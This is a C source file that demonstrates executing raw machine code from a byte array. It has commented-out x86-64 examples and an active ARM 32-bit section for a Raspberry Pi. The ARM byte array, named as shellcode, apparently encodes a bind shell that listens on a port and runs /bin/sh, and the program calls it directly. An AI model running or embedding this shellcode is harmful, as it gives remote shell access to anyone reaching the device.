// Try x86 64 bits code in Google shell cloud and the ARM 32 bits on RPi 3

/*
// Run hex x86 64 bits machine code from .text of the current program
// gcc -o run_hex_machinecode.elf64 run_hex_machinecode.c
// TODO: use char code[] = {...} inside main, with -z execstack, for current Linux
// gcc -z execstack -o run_hex_machinecode.elf64 run_hex_machinecode.c

// Broken on recent Linux, used to work without execstack.
#include <stdio.h>


// can be non-const if you use gcc -z execstack.  static is also optional
//static const char code[] = {
//  0x8D, 0x04, 0x37,           //  lea eax,[rdi+rsi]       // retval = a+b;                    
//  0xC3                        //  ret                                         
//};

//static const char ret0_code[] = "\x31\xc0\xc3";   // xor eax,eax ;  ret
                     // the compiler will append a 0 byte to terminate the C string,
                     // but that's fine.  It's after the ret.


int main () {
  // void* cast is easier to type than a cast to function pointer,
  // and in C can be assigned to any other pointer type.  (not C++)
  // can be non-const if you use gcc -z execstack.  static is also optional
    char code[] = {
        0x8D, 0x04, 0x37,           //  lea eax,[rdi+rsi]       // retval = a+b;                    
        0xC3                        //  ret                                         
    };

    char ret0_code[] = "\x31\xc0\xc3";   // xor eax,eax ;  ret
                     // the compiler will append a 0 byte to terminate the C string,
                     // but that's fine.  It's after the ret.

  int (*sum) (int, int) = (void*)code;
  int (*ret0)(void) = (void*)ret0_code;

  // run code                                                                   
  int c = sum (7, 3);
  printf(" c = %d \n", c);
  return ret0();
}
*/


// Run hex ARM 32 bits machine code from .text of the current program
// gcc -o out/run_hex_machinecode.elf32 run_hex_machinecode.c
// TODO: use char code[] = {...} inside main, with -z execstack, for current Linux
// gcc -z execstack -o out/run_hex_machinecode.elf32 run_hex_machinecode.c

// Broken on recent Linux, used to work without execstack.
#include <stdio.h>


// can be non-const if you use gcc -z execstack.  static is also optional
//static const char code[] = {
//  0x8D, 0x04, 0x37,           //  lea eax,[rdi+rsi]       // retval = a+b;                    
//  0xC3                        //  ret                                         
//};

//static const char ret0_code[] = "\x31\xc0\xc3";   // xor eax,eax ;  ret
                     // the compiler will append a 0 byte to terminate the C string,
                     // but that's fine.  It's after the ret.


int main () {
  // void* cast is easier to type than a cast to function pointer,
  // and in C can be assigned to any other pointer type.  (not C++)
  // can be non-const if you use gcc -z execstack.  static is also optional
    char code[] = {
     0x01, 0x30, 0x8f, 0xe2, 0x13, 0xff, 0x2f, 0xe1, 0x02, 0x20, 0x01, 0x21, 0x92, 0x1a, 0xc8, 0x27, 0x51, 0x37, 0x01, 0xdf, 0x04, 0x1c, 0x12, 0xa1, 0x4a, 0x70, 0x0a, 0x71, 0x4a, 0x71, 0x8a, 0x71, 0xca, 0x71, 0x10, 0x22, 0x01, 0x37, 0x01, 0xdf, 0xc0, 0x46, 0x20, 0x1c, 0x02, 0x21, 0x02, 0x37, 0x01, 0xdf, 0x20, 0x1c, 0x49, 0x1a, 0x92, 0x1a, 0x01, 0x37, 0x01, 0xdf, 0x04, 0x1c, 0x3f, 0x27, 0x20, 0x1c, 0x49, 0x1a, 0x01, 0xdf, 0x20, 0x1c, 0x01, 0x31, 0x01, 0xdf, 0x20, 0x1c, 0x01, 0x31, 0x01, 0xdf, 0x05, 0xa0, 0x49, 0x40, 0x52, 0x40, 0xc2, 0x71, 0x0b, 0x27, 0x01, 0xdf, 0xc0, 0x46, 0x02, 0xff, 0x11, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x58
    };

    //char ret0_code[] = "\x31\xc0\xc3";   // xor eax,eax ;  ret
                     // the compiler will append a 0 byte to terminate the C string,
                     // but that's fine.  It's after the ret.

  void (*main_of_shellc) () = (void*)code;
  //int (*ret0)(void) = (void*)ret0_code;

  // run code
  main_of_shellc();
  //return ret0();
  return 0;
}
